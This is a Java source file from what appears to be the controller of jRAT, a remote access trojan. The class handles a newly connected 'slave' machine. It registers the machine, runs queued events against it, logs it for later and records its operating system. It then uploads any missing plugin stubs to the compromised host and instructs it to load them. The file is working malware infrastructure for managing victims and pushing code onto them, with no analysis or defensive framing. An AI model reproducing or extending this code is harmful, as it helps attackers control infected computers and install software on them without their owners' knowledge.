package io.jrat.controller.packets.incoming;

import io.jrat.controller.Globals;
import io.jrat.controller.Main;
import io.jrat.controller.OfflineSlave;
import io.jrat.controller.Slave;
import io.jrat.controller.addons.Plugins;
import io.jrat.controller.events.Event;
import io.jrat.controller.events.Events;
import io.jrat.controller.net.ConnectionHandler;
import io.jrat.controller.packets.outgoing.Packet101UploadPlugin;
import io.jrat.controller.packets.outgoing.Packet42ServerUploadFile;
import io.jrat.controller.settings.Settings;
import io.jrat.controller.settings.StatisticsOperatingSystem;
import io.jrat.controller.settings.StoreOfflineSlaves;
import io.jrat.controller.threads.UploadThread;

import java.io.DataInputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import jrat.api.Plugin;

public class Packet3Initialized extends AbstractIncomingPacket {

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		ConnectionHandler.addSlave(slave);

		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}
		
		StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
		StatisticsOperatingSystem.getGlobal().add(slave);

		List<String> plugins = new ArrayList<String>(Arrays.asList(slave.getPlugins()));
		List<String> notInstalled = new ArrayList<String>();

		if (plugins != null && Settings.getGlobal().getBoolean("plugintransfer")) {
			for (Plugin plugin : Plugins.getPlugins()) {
				if (!plugins.contains(plugin.getName())) {
					notInstalled.add(plugin.getName());
					Main.debug("Plugin " + plugin.getName() + " is not installed, adding to list");
				}
			}

			Map<String, File> filesToTransfer = new HashMap<String, File>();

			for (String sp : notInstalled) {
				Plugin plugin = Plugins.getPlugin(sp);
				File[] files = Globals.getPluginStubDirectory().listFiles();

				for (File stubFile : files) {
					if (stubFile.getName().startsWith(plugin.getName())) {
						Main.debug("Found stub plugin " + stubFile.getName() + " for plugin " + plugin.getName());
						filesToTransfer.put(plugin.getName(), stubFile);
						continue;
					}
				}
			}

			for (final String key : filesToTransfer.keySet()) {
				File file = filesToTransfer.get(key);

				Main.debug("Transferring " + key);

				slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true, new UploadThread(null, key, file) {
					@Override
					public void onComplete() {
						super.onComplete();
						slave.addToSendQueue(new Packet101UploadPlugin(key));
					}
				}));
			}
		}
	}

}
